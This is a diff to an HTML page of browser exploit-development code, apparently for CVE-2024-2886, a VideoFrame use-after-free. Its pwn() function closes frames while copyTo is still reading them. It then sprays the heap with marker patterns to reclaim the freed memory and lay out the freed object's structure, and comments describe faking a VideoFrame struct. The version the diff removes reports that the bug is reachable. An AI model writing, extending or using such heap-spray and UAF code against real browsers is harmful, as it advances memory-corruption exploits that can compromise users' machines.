@@ -7,118 +7,119 @@
 const log = s => { out.innerHTML += s + '<br>'; console.log(s); };
 
 async function pwn() {
-    log('CVE-2024-2886 — GPU-backed VideoFrame UAF');
-    log('Using WebGL canvas for GPU-backed frames');
+    log('CVE-2024-2886 — UAF structure analysis');
     log('');
 
-    // Create GPU-backed VideoFrame via WebGL canvas
-    // WebGL frames are GPU-resident, triggering the real GPU readback UAF
     const canvas = new OffscreenCanvas(64, 64);
-    const gl = canvas.getContext('webgl') || canvas.getContext('webgl2');
-
-    if (!gl) {
-        log('[!] WebGL not available, trying experimental-webgl...');
-        // Fallback: try ImageBitmap path
-        return await tryImageBitmapUAF();
-    }
-    log('[+] WebGL context: ' + (gl instanceof WebGL2RenderingContext ? 'WebGL2' : 'WebGL1'));
-
-    // Draw red via WebGL (GPU-resident texture)
+    const gl = canvas.getContext('webgl');
     gl.clearColor(1.0, 0.0, 0.0, 1.0);
     gl.clear(gl.COLOR_BUFFER_BIT);
+    gl.finish();
 
-    // Baseline: normal copyTo without close
+    // Baseline
     const frameBase = new VideoFrame(canvas, { timestamp: 0 });
     const bufBase = new Uint8Array(frameBase.allocationSize());
     await frameBase.copyTo(bufBase);
     frameBase.close();
-    const baseHex = Array.from(bufBase.slice(0, 16))
-        .map(x => x.toString(16).padStart(2,'0')).join(' ');
-    log('[baseline] ' + baseHex + ' size=' + bufBase.length);
+    log('[baseline] first 32 bytes:');
+    log('  ' + Array.from(bufBase.slice(0, 32)).map(x=>x.toString(16).padStart(2,'0')).join(' '));
+    log('[baseline] size: ' + bufBase.length);
     log('');
 
-    // UAF attempts with GPU-backed frames
-    let succeeded = 0, differs = 0;
-
-    for (let i = 0; i < 20; i++) {
-        // Vary the color each time so we can detect if memory is reused
-        gl.clearColor(i / 20.0, 0.5, 1.0 - i/20.0, 1.0);
+    // Test 1: spray with 0xBB - do we get 0xBB back?
+    {
+        gl.clearColor(1.0, 0.0, 0.0, 1.0);
         gl.clear(gl.COLOR_BUFFER_BIT);
-        gl.finish(); // force GPU flush
-
-        const frame = new VideoFrame(canvas, { timestamp: i * 1000 });
-        const size = frame.allocationSize();
-        const buf = new Uint8Array(size);
-
-        // GPU readback UAF race
-        const promise = frame.copyTo(buf);
-        frame.close(); // free GPU texture while readback in progress
-
-        // Spray heap to reclaim freed GPU VideoFrame wrapper
+        gl.finish();
+        const frame = new VideoFrame(canvas, { timestamp: 1000 });
+        const buf = new Uint8Array(frame.allocationSize());
+        const p = frame.copyTo(buf);
+        frame.close();
         const spray = [];
-        for (let j = 0; j < 500; j++) {
+        for (let i = 0; i < 500; i++) { const s = new Uint8Array(512); s.fill(0xBB); spray.push(s); }
+        await p;
+        spray.length = 0;
+        log('[spray=0xBB] first 32 bytes:');
+        log('  ' + Array.from(buf.slice(0, 32)).map(x=>x.toString(16).padStart(2,'0')).join(' '));
+        const hasBB = buf.slice(0,32).some(b => b === 0xBB);
+        log('  contains 0xBB: ' + hasBB);
+    }
+
+    log('');
+
+    // Test 2: spray with 0xCC
+    {
+        gl.clearColor(1.0, 0.0, 0.0, 1.0);
+        gl.clear(gl.COLOR_BUFFER_BIT);
+        gl.finish();
+        const frame = new VideoFrame(canvas, { timestamp: 2000 });
+        const buf = new Uint8Array(frame.allocationSize());
+        const p = frame.copyTo(buf);
+        frame.close();
+        const spray = [];
+        for (let i = 0; i < 500; i++) { const s = new Uint8Array(512); s.fill(0xCC); spray.push(s); }
+        await p;
+        spray.length = 0;
+        log('[spray=0xCC] first 32 bytes:');
+        log('  ' + Array.from(buf.slice(0, 32)).map(x=>x.toString(16).padStart(2,'0')).join(' '));
+        const hasCC = buf.slice(0,32).some(b => b === 0xCC);
+        log('  contains 0xCC: ' + hasCC);
+    }
+
+    log('');
+
+    // Test 3: spray with structured data - fake a pointer-like pattern
+    // If we can control specific offsets we can fake a VideoFrame struct
+    {
+        gl.clearColor(1.0, 0.0, 0.0, 1.0);
+        gl.clear(gl.COLOR_BUFFER_BIT);
+        gl.finish();
+        const frame = new VideoFrame(canvas, { timestamp: 3000 });
+        const buf = new Uint8Array(frame.allocationSize());
+        const p = frame.copyTo(buf);
+        frame.close();
+
+        // Spray with incrementing pattern so we can see exact offsets
+        const spray = [];
+        for (let i = 0; i < 500; i++) {
             const s = new Uint8Array(512);
-            s.fill(0xBB);
+            for (let j = 0; j < 512; j++) s[j] = j & 0xFF; // 0x00..0xFF pattern
             spray.push(s);
         }
+        await p;
+        spray.length = 0;
 
-        try {
-            await promise;
-            succeeded++;
-            spray.length = 0;
+        log('[spray=0x00..FF] first 64 bytes:');
+        log('  ' + Array.from(buf.slice(0, 32)).map(x=>x.toString(16).padStart(2,'0')).join(' '));
+        log('  ' + Array.from(buf.slice(32, 64)).map(x=>x.toString(16).padStart(2,'0')).join(' '));
 
-            const hex = Array.from(buf.slice(0, 16))
-                .map(x => x.toString(16).padStart(2,'0')).join(' ');
-            const diff = buf.some((b, idx) => b !== bufBase[idx]);
-            if (diff) differs++;
-
-            log('[' + i + '] ' + hex + (diff ? ' <<< DIFFERS' : ' (same)'));
-        } catch(e) {
-            spray.length = 0;
-            log('[' + i + '] threw: ' + e.message);
-        }
+        // What offset in the spray pattern did copyTo read from?
+        const firstByte = buf[0];
+        log('  first byte 0x' + firstByte.toString(16) + ' -> spray offset ~0x' + firstByte.toString(16));
     }
 
     log('');
-    log('succeeded: ' + succeeded + '/20  differs: ' + differs + '/20');
 
-    if (differs > 0) {
-        log('REAL GPU UAF CONFIRMED');
-        log('GPU memory freed and reclaimed — exploit path viable');
-        return true;
-    } else if (succeeded === 20) {
-        log('copyTo completes after close but bytes unchanged');
-        log('GPU frame may still be kept alive by readback ref');
-        log('Need hardware-decoded frames for real GPU UAF');
-        return 'partial';
-    } else {
-        return false;
+    // Test 4: no spray at all — what do we get?
+    {
+        gl.clearColor(1.0, 0.0, 0.0, 1.0);
+        gl.clear(gl.COLOR_BUFFER_BIT);
+        gl.finish();
+        const frame = new VideoFrame(canvas, { timestamp: 4000 });
+        const buf = new Uint8Array(frame.allocationSize());
+        const p = frame.copyTo(buf);
+        frame.close();
+        // No spray - what's naturally at that address?
+        await p;
+        log('[no spray] first 32 bytes:');
+        log('  ' + Array.from(buf.slice(0, 32)).map(x=>x.toString(16).padStart(2,'0')).join(' '));
     }
+
+    log('');
+    log('Analysis done. Compare patterns to understand freed object structure.');
 }
 
-async function tryImageBitmapUAF() {
-    log('[*] Trying ImageBitmap-backed VideoFrame...');
-    
-    const bitmap = await createImageBitmap(
-        new ImageData(new Uint8ClampedArray(64*64*4).fill(128), 64, 64)
-    );
-    
-    const frame = new VideoFrame(bitmap, { timestamp: 0 });
-    const buf = new Uint8Array(frame.allocationSize());
-    const promise = frame.copyTo(buf);
-    frame.close();
-    
-    try {
-        await promise;
-        log('[+] ImageBitmap UAF: copyTo succeeded after close');
-        return 'partial';
-    } catch(e) {
-        log('[!] threw: ' + e.message);
-        return false;
-    }
-}
-
-pwn().then(r => { log(''); log('RESULT: ' + r); });
+pwn();
 </script>
 </body>
 </html>
